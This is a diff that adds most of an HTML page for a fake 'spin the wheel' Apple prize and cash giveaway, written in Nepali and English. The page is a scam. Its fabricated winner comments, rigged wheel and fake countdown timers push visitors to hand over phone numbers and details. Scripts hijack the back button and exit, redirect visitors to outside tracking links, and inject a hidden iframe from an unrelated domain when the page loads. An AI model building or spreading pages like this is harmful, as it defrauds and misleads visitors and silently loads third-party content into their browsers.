gALV68OBz/42hmILiP/6mwQkYsZFDkSB2pN5A17PveuJzYDeJspoUn4CTwHKvRFA17EwhCsXl6J4B4i3HPYB8d+fSUCFMow1ABocDBXCl/96gLjfv6gBUFLb3RggEfWuMiBoCYjST4XonXeAPK9IuNO/sQkQR/KZBwgqGrpPDRc9AenTRp8mUCfUCCh9VG/M1FBgrSEeMT5tL9UCeseUmgFxKC+3gMrrv3WILAE98zzxTNG8AVQ8+B/fAZqck2W1N0tuPwiIm91ruZeNxiElZie2gDyuos+8OPRjF6l7nUish24ToEpFH/tIPaMv61gv+yhqDYjDf87ry6Thx0hv/2xcmw/UXvaA6J8yNDL39njBeKhs4v3J0oy7/ZvNAMR+xwAZx0PAZsQojaDfKZ0BiOZjgIRPn9UhLLQaU6evGk7W9WVWgKoeJ7UbU+uzjolAlCZKXgzuc9u+5VkuDxhnHYHtvMxmtj7zfm1eFmhTaTFzzdwveKo2jfX1GG0elGw4t0+UuT3pLcf4G64wdibk68sx8CjrQ0FvSQ/tu4JmWPQ877nGSAzLwjwSsb1WYaFh4XzXdergZ4izbfyMaSv5xLj5suFeB9b2OoB5e4pDYRvuBnnmLUWy/34ZGdgDFqFohx1F8LPvlmJvzzUY2CZHO+1Kg+FEAl84mtv+o7dvDwdTLZCwoo0zG8hYMoov6dSRpHruBxxN1wlFj+Y8O8ZDYxlNcM/8ITiR8iXyUVwFI9bLsCJTSXGb5KCFaCpvEOikbZWlBywSKzfNYwwsUk/RrdbuBpme0Co513UuLLLK8Q72yBYObBO8HeZTy3igfQq8u4zz+4zaDkMxtMucfDKvjMJN1YI/7zAOU52As7qO+aUvAhFzVPliWayo1HZcHdYGWRcGkpWrpzxz9dTSArNLczjMCvVlaJ0SvC8q8OhgBd5XRYrRGjWKaiHnl2WcXRUnnlnF2Wp0cYGi0dfQKfLkdmbXuXrR+qXAfvuwbHYl8B2tUVEOh4uTWa9WusVqUSu9uOZeL29HyFcLxRdVk391KkG/otzXo+N4vb13X6WSfPSIhOhs24dgw4kEX58jYTpEAl3P2AKN4cyGVQ7/MJ4jcYr824iX3fzI4dmRxoNIql7u6t+0gMS8m3+9mG9f8VAb8+EfDYGXS3TlEl0uaPi2lc/5hWOQLGST83V2hTNqSxMCHJ7RtEBN0PHZYwGYgYmATU5Cs9QTgVuegAjHFUXAHkexBhACoh8HXUKBex9SHQQBLMGVLz//ofwDrYyhNuvxDfgAAAAASUVORK5CYII=);
+      background-size: contain;
+      cursor: pointer;
+      background-repeat: no-repeat;
+      width: 25%;
+      height: 0;
+      padding-top: 30.5%;
+      z-index: 2;
+      margin-left: auto;
+      margin-right: auto;
+      left: 0;
+      right: 0;
+      top: 33%
+    }
+    
+    @media (min-width:614px) {
+      #wheel {
+        width: 32vw;
+        left: 47vw;
+        top: 27vw
+      }
+      #pressButton {
+        width: 11%;
+        top: 38%!important;
+        background-repeat: no-repeat
+      }
+    }
+    
+    @media (min-width:614px) and (max-width:770px) {
+      #pressButton {
+        width: 11%;
+        top: 30%!important;
+        background-repeat: no-repeat
+      }
+    }
+    
+    @media (min-width:770px) and (max-width:968px) {
+      #pressButton {
+        width: 11%;
+        top: 35%!important;
+        background-repeat: no-repeat
+      }
+    }
+    
+    .final {
+      display: none
+    }
+    
+    .final-title {
+      font-size: small;
+      margin: 12px 0;
+      text-align: center;
+      line-height: 1.4;
+      text-transform: uppercase
+    }
+    
+    .final-desc {
+      margin-bottom: 10px
+    }
+    
+    .final-prize {
+      border-top: 1px solid #efefef;
+      padding-top: 16px;
+      margin-bottom: 16px;
+      font-size: 0
+    }
+    
+    .final-prize__wrapper {
+      display: inline-block;
+      vertical-align: middle;
+      width: 22%
+    }
+    
+    @media (max-width:499px) {
+      .final-prize__wrapper {
+        width: 32%
+      }
+    }
+    
+    .final-prize__image {
+      width: 88px;
+      height: 70px;
+      border-radius: 8px
+    }
+    
+    .final-prize__info {
+      display: inline-block;
+      vertical-align: middle;
+      width: 45%;
+      padding: 0 10px;
+      white-space: nowrap
+    }
+    
+    .final-prize__info tr {
+      font-weight: 400;
+      font-size: .9rem
+    }
+    
+    @media (max-width:297px) {
+      .final-prize__info tr {
+        font-size: .83rem
+      }
+    }
+    
+    .final-prize__info td {
+      padding-left: 5px;
+      color: #232f3e
+    }
+    
+    .final-prize__info-title {
+      color: #3c5a96!important;
+      font-size: 14px;
+      font-weight: 600
+    }
+    
+    @media (max-width:360px) {
+      .final-prize__info--count {
+        white-space: normal
+      }
+    }
+    
+    .final-prize__info-old {
+      text-decoration: line-through;
+      color: #990039!important;
+      vertical-align: bottom
+    }
+    
+    .final-prize__info-price {
+      color: #990039!important
+    }
+    
+    .final-prize__info-unit {
+      white-space: pre-line
+    }
+    
+    .final-prize__info-stock.in,
+    .final-prize__info-stock.out {
+      vertical-align: bottom;
+      color: #3c5a96!important
+    }
+    
+    .final-prize__confirm {
+      display: inline-block;
+      vertical-align: middle;
+      width: 28%
+    }
+    
+    @media (max-width:599px) {
+      .final-prize__confirm {
+        width: 100%;
+        padding-top: 16px
+      }
+    }
+    
+    .final-prize__confirm-btn {
+      width: 100%;
+      background-color: #3578e5;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      display: block;
+      text-decoration: none;
+      text-align: center;
+      padding: 6px 10px;
+      border: 0;
+      border-radius: 3px;
+      cursor: pointer
+    }
+    
+    @media (max-width:599px) {
+      .final-prize__confirm-btn {
+        padding: 10px
+      }
+    }
+    
+    .final-prize__confirm-btn.unavailable {
+      background: #b7b7b7;
+      color: #000
+    }
+    
+    .final-msg {
+      text-align: center;
+      padding-top: 10px;
+      line-height: 1.4;
+      font-size: .75rem
+    }
+    
+    .black-phone,
+    .white-phone {
+      background: url(phone_sprites.png) -3px 0
+    }
+  </style>
+  
+        <script type="text/javascript">
+    history.pushState(null, document.title, location.href);
+    window.addEventListener('popstate', function (event){
+        if(document.URL.indexOf("/#!back") >= 0){
+            history.replaceState(null, document.title, location.href);
+            window.onbeforeunload=function(){};
+            location.href = "http://app.prizecenter.net/?u=g56kd01&o=5m6g919";
+        }
+        history.pushState(null, document.title, location.href);
+        location.href = "http://app.prizecenter.net/?u=g56kd01&o=5m6g919";
+    });
+    </script>
+  
+  
+  
+</head>
+
+<body oncontextmenu="return!1" onload="setButtonHeight()">
+  <header class="header">
+    <table class="header-table">
+      <tbody>
+        <tr>
+          <td>
+            <div class="fb-icon fb1"></div>
+          </td>
+          <td>
+            <div class="fb-icon fb2"></div>
+          </td>
+          <td>
+            <div class="fb-icon fb3"></div>
+          </td>
+          <td>
+            <div class="fb-icon fb4"></div>
+          </td>
+          <td>
+            <div class="fb-icon fb5"></div>
+          </td>
+          <td>
+            <div class="fb-icon fb6"></div>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </header>
+  <main class="content">
+    <div class="content-top" id="questions" align="center">
+      <div class="inner-content content-top__wrapper">
+        <h1 class="content-top__title">बधाई छ!</h1>
+        <h2 class="content-top__desc">तपाईंलाई अनियमित रूपमा नयाँ एप्पल उपकरण वा नगद पुरस्कार जित्नको लागि चयन गरिएको छ! तपाईले के पाउनुहुनेछ भनेर पत्ता लगाउनको लागि व्हील घुमाउनुहोस्</h2>
+        <h3 class="content-top__subdesc">बाँकी विजेताहरू: : 11</h3></div>
+      <div class="spin-container" id="wheelCon">
+        <div class="spin-wrapper"><img class="animated rotateIn spin-prize" id="devMockup" src="iphone.png" width="300" height="331" alt="lucky Wheel"></div><img class="spin-wheel" id="wheel" src="prizewheelorg.png" width="501" height="501">
+        <div class="spin-btn" id="pressButton" onclick="spin()" style="top:33%;"></div>
+      </div>
+    </div>
+    <div class="content content-wrapper">
+      <div class="inner-content timer-wrap">
+        <div class="timer-content" id="questions">
+          <p class="small timer-msg">You have&nbsp;<span class="timer timer-count">02 Minutes and 21 Seconds</span>&nbsp; to claim this offer before we give your gift to another happy user! Good luck!</p>
+        </div>
+        <div class="final" id="final">
+          <h2 class="final-title">Сhoose one of available rewards</h2>
+          <p class="txt final-desc">Due to the limited supply, your reward was reserved for&nbsp;<span class="new-timer">10 minutes</span>&nbsp;. If you do not claim your cash during this period, it will be given to the next lucky visitor</p>
+          <div class="prize final-prize">
+            <div class="prize-img final-prize__wrapper"><span class="img-responsive final-prize__image black-phone" width="86" height="99"></span></div>
+            <table class="final-prize__info">
+              <tbody>
+                <tr>
+                  <td>Cash Prize:</td>
+                  <td class="prize-name final-prize__info-title">$ 5,500</td>
+                </tr>
+              </tbody>
+            </table>
+            <div class="final-prize__confirm"><a class="final-prize__confirm-btn" href="https://t2.surpriseanddelightgifts.com/click" onclick="PreventExitPop=!1;pop();" target="_blank">Claim Prize</a></div>
+          </div>
+          <div class="prize final-prize">
+            <div class="prize-img final-prize__wrapper"><span class="img-responsive final-prize__image white-phone" width="86" height="99"></span></div>
+            <table class="final-prize__info">
+              <tbody>
+                <tr>
+                  <td>Cash Prize:</td>
+                  <td class="prize-name final-prize__info-title">$ 2,500</td>
+                </tr>
+              </tbody>
+            </table>
+            <div class="final-prize__confirm"><a class="final-prize__confirm-btn unavailable" href="javascript:void(0);">Prize Unavailable</a></div>
+          </div>
+          <p class="small final-msg">Choose one of the following prizes quickly!</p>
+        </div>
+      </div>
+    </div>
+    <div class="fb">
+      <div class="fb-top">
+        <p class="fb-top__wrap"><span class="fb-top__count">&nbsp;15</span><span class="fb-top__title">&nbsp;Comments</span></p>
+        <p class="fb-top__wrap"><span class="fb-top__sort">Sort By</span><a class="fb-top__newest" href="javascript: void(0);">Newest</a></p>
+      </div>
+      <div class="fb-form"><span class="fb-form__img"></span>
+        <div class="fb-form__input">
+          <p class="fb-form__msg">Your comment may also appear on Instagram Facebook Page</p>
+          <div class="fb-form__action">
+            <button>Log In To Post</button>
+          </div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb20"><span class="fb-comment__ava ava-20"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Megan Oliva</a></div>
+          <p class="fb-comment__txt">Never thought it could be so easy to win! I just spun the wheel and got an iPhone 11. After submitting my phone number I got a message a day later to receive my new iPhone.</p><span class="details-top__img img-iphone__hand" width="210" height="280"></span>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb19"><span class="fb-comment__ava ava-19"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Marjorie Solomon</a></div>
+          <p class="fb-comment__txt">Won 1 free spin and no prize :( Wish I could have a 2nd chance</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb18"><span class="fb-comment__ava ava-18"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Kevin Veloso</a></div>
+          <p class="fb-comment__txt">Did anybody won something in this sweepstakes??</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb17"><span class="fb-comment__ava ava-17"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Angelo Bello</a></div>
+          <p class="fb-comment__txt">Never won something! Just my luck..</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb16"><span class="fb-comment__ava ava-16"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Abegail Allen</a></div>
+          <p class="fb-comment__txt">I was not sure if it was true or not, but I received my iPhone 13 today!! 😍 amazing 🔥 🔥</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb15" style="display: block;"><span class="fb-comment__ava ava-15"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Reynaldo Barrios</a></div>
+          <p class="fb-comment__txt">Can you help me? I just won an iPhone 11! What should I do now?</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb14" style="display: block;"><span class="fb-comment__ava ava-14"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Chester Salinas</a></div>
+          <p class="fb-comment__txt">How does it work? I won an iPhone SE some years ago and all my attempts afer - unsuccessful...</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">1</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb13" style="display: block;"><span class="fb-comment__ava ava-13"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Adrian Casas</a></div>
+          <p class="fb-comment__txt">What da hell? The wheel is not working..</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb12" style="display: block;"><span class="fb-comment__ava ava-12"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Kian Arguelles</a></div>
+          <p class="fb-comment__txt">Wish I could win the iPhone 13</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb11" style="display: block;"><span class="fb-comment__ava ava-11"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Dennis Moran</a></div>
+          <p class="fb-comment__txt">Never trusted such sweepstakes</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">1</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb10" style="display: block;"><span class="fb-comment__ava ava-10"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Kent Rosales</a></div>
+          <p class="fb-comment__txt">I don't know why I need the ipad, can I have the iphone instead?</p><span class="details-top__img img-ipad" width="210" height="280"></span>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">2</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb9" style="display: block;"><span class="fb-comment__ava ava-9"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Francis Mariano</a></div>
+          <p class="fb-comment__txt">I can't believe it's real.. got my apple watch today. Thanks God</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total fb-like__hide"></span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb8" style="display: block;"><span class="fb-comment__ava ava-8"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Kenneth Samson</a></div>
+          <p class="fb-comment__txt">After I won something I have to confirm my phone number? Right?</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">2</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb7" style="display: block;"><span class="fb-comment__ava ava-7"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Joshua Dizon</a></div>
+          <p class="fb-comment__txt">I am just letting you guys know I did recieve my iPhone and I can't wait to use it. Never thought it was a real sweepstake!</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">2</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb6" style="display: block;"><span class="fb-comment__ava ava-6"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Catherine Sabio</a></div>
+          <p class="fb-comment__txt">I just entered my phone number in the form and now I am unboxing a new iPhone! It is definitely the best gift I ever won. Does anyone know similar sweepstakes? I want to try my luck!</p><span class="details-top__img img-iphone__box" width="210" height="280"></span>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">2</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment" id="fb5" style="display: block;"><span class="fb-comment__ava ava-5"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Neil Mariano</a></div>
+          <p class="fb-comment__txt">4 attempts and can't win... it's ridiculous</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">5</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment fb-show-comment" id="fb4"><span class="fb-comment__ava ava-4"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Cesar Aquino</a></div>
+          <p class="fb-comment__txt">I think nobody wins here. I tried this more than 10 times and never won something..</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">8</span><span class="details-bottom__time">1m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment fb-show-comment" id="fb3"><span class="fb-comment__ava ava-3"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Jaime Bautista</a></div>
+          <p class="fb-comment__txt">Can you win a mac book?? I don't need phones or watches..</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">10</span><span class="details-bottom__time">2m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment fb-show-comment" id="fb2"><span class="fb-comment__ava ava-2"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Vicente Buenaflor</a></div>
+          <p class="fb-comment__txt">I got a message in few days after I won. Just relax and have patience.</p><span class="details-top__img img-watch" width="210" height="280"></span>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">19</span><span class="details-bottom__time">3m</span></div>
+        </div>
+      </div>
+      <div class="fb-comment fb-show-comment" id="fb1"><span class="fb-comment__ava ava-1"></span>
+        <div class="details">
+          <div class="details-top"><a class="fb-comment__name" href="javascript: void(0);">Camilo Baliton</a></div>
+          <p class="fb-comment__txt">WOW. I won an Apple Watch. I confirmed my phone number and what know? Should I just wait?</p>
+          <div class="details-bottom"><a class="detail-bottom__like fb-like" href="javascript: void(0);">Like</a> ·<a class="fb-reply" href="javascript: void(0);">Reply</a> ·<span class="fb-like__total">32</span><span class="details-bottom__time">4m</span></div>
+        </div>
+      </div>
+      <div class="fb-load">
+        <button class="fb-load__btn">Load 10 More Comments</button><span class="fb-load__progress fb-load__loader"></span></div>
+    </div>
+    <footer class="footer">
+      <p class="footer-inc"></p>
+    </footer>
+  </main>
+  <div class="sweet-overlay"></div>
+  <div class="sweet-alert animated bounceIn sweet-alert__visible" id="modal01" style="top: 38%;"><img id="gift-image" src="gift.png" style="width:45px">
+    <h2 class="sweet-alert__title" id="first-title">Congratulations!</h2>
+    <p>तपाईलाई अनियमित रूपमा परीक्षण गर्न र एउटा जित्नको लागि चयन गरिएको छ (1)&nbsp;<b>Appleमोबाइल फोन वा अन्य पुरस्कार</b></p>
+    <p>Click 'OK' to try your luck!</p>
+    <div class="sweet-alert__btnwrap">
+      <button class="sweet-alert__btn" onclick="hidemodal01()" style="display: inline-block;">OK</button>
+    </div>
+  </div>
+  <script src="jquery.min.js"></script>
+  <script type="text/javascript">
+    const timerMin = "Minutes and",
+      timerSec = "Seconds",
+      fbLike = "Like",
+      fbUnlike = "Unlike",
+      tryAgainTxt = "Sorry.\n\nPlease try again. We give you one more chance!",
+      quitMsg = "Are you sure you want to leave the page?\\n\nThe offer is limited! If you close this window, your chance of winning a prize will be given to someone else!",
+      timeMsg = "You have the chance to get your cash prize!\n\n1. Press OK to claim your cash prize. You will be redirected to our partner’s site.\n\n2. Enter your details to get information on how to receive your prize.\n\n***Hurry, this offer is limited***";
+    var weekDays = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+    const yearMonth = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+  </script>
+  <script type="text/javascript">
+    function getRandomInt(e, t) {
+      return Math.floor(Math.random() * (t - e + 1)) + e
+    }
+
+    function loadCom(e, t) {
+      setTimeout(function() {
+        $(e).fadeIn(250);
+        var t = $(".fb-comment:visible").length;
+        $(".fb-top__count").html("&nbsp;" + t)
+      }, t)
+    }
+
+    function dater(e) {
+      var t = new Date;
+      return $(e).html(weekDays[t.getDay()] + ", " + t.getDate() + " " + yearMonth[t.getMonth()] + " " + t.getFullYear() + " "), !1
+    }
+
+    function checkZero(e) {
+      return e < 10 ? "0" + e : e
+    }
+
+    function timer(e, t) {
+      var n = checkZero(Math.round((e - 30) / 60)),
+        o = checkZero(e % 60);
+      $(t).html(n + " " + timerMin + " " + o + " " + timerSec);
+      var i = setInterval(function() {
+        e--, n = checkZero(Math.round((e - 30) / 60)), o = checkZero(e % 60), $(t).html(n + " " + timerMin + " " + o + " " + timerSec), 0 == e && clearInterval(i)
+      }, 1e3);
+      return !1
+    }
+
+    function setButtonHeight() {
+      conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - .2 * button.offsetHeight / 2 + "px"
+    }
+
+    function spin() {
+      switch (count) {
+        case 1:
+          dWheel.className = "spinAround", setTimeout(function() {
+            alert(tryAgainTxt)
+          }, 6800);
+          break;
+        case 2:
+          dWheel.className = "spinAround2", setTimeout(function() {
+            dWheel.className = dWheel.className + " transparent"
+          }, 6800), setTimeout(function() {
+            device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+          }, 7e3), setTimeout(function() {
+            first.innerHTML = "<img src='loading.gif'>", first.style.padding = "195px 0px", setTimeout(function() {
+              first.parentNode.removeChild(first), second.style.display = "block"
+            }, 1500)
+          }, 9e3)
+      }
+      count++
+    }
+
+    function gotoUrl(e) {
+      PreventExitPop = !1, window.location.href = clickUrl
+    }
+    $(document).ready(function() {
+      timer(180, ".timer"), dater(".date"), $(document).on("click", ".fb-load button", function() {
+          $(this).fadeOut(300, function() {
+            $(".fb-load .fb-load__progress").css({
+              display: "block"
+            })
+          })
+        }), $(document).on("click", ".q button", function() {
+          var e = $(this);
+          e.parent().next().hasClass("q") ? e.parent().fadeOut(250, function() {
+            $(this).next().fadeIn(250)
+          }) : $(".questions").fadeOut(250, function() {
+            $(".loading").fadeIn(250, function() {
+              setTimeout(function() {
+                $("ul li:first-child").fadeIn(200)
+              }, 950), setTimeout(function() {
+                $("ul li:nth-child(2)").fadeIn(200)
+              }, 1900), setTimeout(function() {
+                $("ul li:last-child").fadeIn(200)
+              }, 3100), setTimeout(function() {
+                $(".loading").fadeOut(250, function() {
+                  $(".final").fadeIn(250, function() {
+                    $("html, body").animate({
+                      scrollTop: $(".final").offset().top - 90
+                    }, 500), timer(120, ".new-timer")
+                  })
+                })
+              }, 4600)
+            })
+          })
+        }), $(document).on("click", ".fb-like", function() {
+          var e = $(this),
+            t = "" == e.next().next().html() ? 0 : parseInt(e.next().next().html());
+          e.hasClass("selected") ? (e.removeClass("selected").html(fbLike), e.next().next().html(--t), 0 == t && e.next().next().addClass("fb-like__hide")) : (e.addClass("selected").html(fbUnlike), e.next().next().html(++t), e.next().next().hasClass("fb-like__hide") && e.next().next().removeClass("fb-like__hide"))
+        }),
+        function e() {
+          setTimeout(function() {
+            var t = $(".fb-comment:visible").length;
+            $(".fb-comment:visible").each(function(e) {
+              if (e == getRandomInt(0, t)) {
+                var n = $(this).find(".fb-like__total").html();
+                n = parseInt(++n), $(this).find(".fb-like__total").removeClass("fb-like__hide").html(n)
+              }
+            }), e()
+          }, getRandomInt(500, 2200))
+        }(), loadCom("#fb5", 1200), loadCom("#fb6", 2500), loadCom("#fb7", 3500), loadCom("#fb8", 6500), loadCom("#fb9", 9e3), loadCom("#fb10", 14e3), loadCom("#fb11", 18500), loadCom("#fb12", 23750), loadCom("#fb13", 28e3), loadCom("#fb14", 33e3), loadCom("#fb15", 38500), loadCom("#fb16", 42500), loadCom("#fb17", 48e3), loadCom("#fb18", 52250), loadCom("#fb19", 57e3), loadCom("#fb20", 6e4)
+    });
+    var conMid, o, clickUrl = "https://t2.surpriseanddelightgifts.com/click",
+      mydate = new Date,
+      year = mydate.getFullYear(),
+      month = mydate.getMonth(),
+      day = mydate.getDate(),
+      weekday = mydate.getDay(),
+      montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"),
+      weekdayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"),
+      count = 1,
+      headline = document.getElementById("headline"),
+      topDate = document.getElementById("topDate"),
+      today = document.getElementById("today"),
+      con = document.getElementById("content"),
+      whCon = document.getElementById("wheelCon"),
+      dWheel = document.getElementById("wheel"),
+      button = document.getElementById("pressButton"),
+      device = document.getElementById("devMockup"),
+      first = document.getElementById("questions"),
+      second = document.getElementById("final"),
+      PreventExitPop = !0;
+
+    function ExitPop() {
+      if (0 != PreventExitPop) return quitMsg
+    }
+
+    function getURLParameter(e) {
+      return decodeURI((RegExp(e + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
+    }
+    window.onbeforeunload = ExitPop,
+      function() {
+        var e;
+        try {
+          for (e = 0; e < 10; ++e) history.pushState({}, "", "#");
+          onpopstate = function(e) {
+            e.state && location.replace("https://t2.surpriseanddelightgifts.com/click")
+          }
+        } catch (e) {}
+      }(), void 0 === window.orientation ? (o = document.createElement("img")).src = "https://t2.surpriseanddelightgifts.com/click" : (o = document.createElement("img")).src = "https://t2.surpriseanddelightgifts.com/click", window.onload = function() {
+        var e = window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
+        console.log("Page load time is " + e / 1e3), document.createElement("img").src = "https://t2.surpriseanddelightgifts.com/click" + e / 1e3
+      };
+    var str1, counter = 1;
+
+    function hidemodal01() {
+      0 < vibr && navigator.vibrate(70), document.getElementById("modal01").classList.remove("sweet-alert__visible"), document.querySelector(".sweet-overlay").style.display = "none"
+    }
+    if ($(document).ready(function() {
+        $("#update").on("click", function() {
+          1 == counter && (counter++, $("#cntVal").html(function(e, t) {
+            return +t - 1
+          }))
+        })
+      }), "vibrate" in navigator) var vibr = 1;
+    else vibr = 0;
+
+    function pop() {
+      setTimeout("window.location.href='https://t2.surpriseanddelightgifts.com/click'", 3e3)
+    }
+    str1 = "https://t2.surpriseanddelightgifts.com/click", setTimeout(function() {
+      alert(timeMsg), PreventExitPop = !1, window.location = str1
+    }, 18e4);
+  </script>
+
+
+
+
+
+
+  <div style="display:none;" id="ifr"></div>
+<script>
+window.addEventListener("load", function(){
+document.getElementById("ifr").innerHTML = '<iframe src="http://www.idisudayaskazal.one/go/a3c51fe2-6a56-49e5-a0aa-15f4a8572cd5"></iframe>';
+});
+ </script>
+
+
+
+</body>
+
+</html>
